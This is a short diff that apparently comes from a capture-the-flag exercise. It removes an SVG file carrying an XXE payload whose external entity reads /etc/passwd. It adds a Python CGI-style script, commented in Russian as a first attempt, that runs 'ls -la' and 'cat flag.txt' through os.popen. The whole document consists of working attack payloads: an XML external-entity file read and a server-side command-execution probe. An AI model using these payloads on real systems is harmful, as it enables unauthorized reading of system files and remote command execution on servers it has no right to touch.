@@ -1,5 +1,11 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
-  <text x="10" y="40" font-size="20">Content: &xxe;</text>
-</svg>
+import os
+
+# Попытка 1: Просто вывести список файлов (если это CGI)
+print("Content-Type: text/plain\n") 
+try:
+    print("--- DIRECTORY LISTING ---")
+    print(os.popen("ls -la").read())
+    print("--- FLAG ---")
+    print(os.popen("cat flag.txt").read())
+except Exception as e:
+    print(str(e))
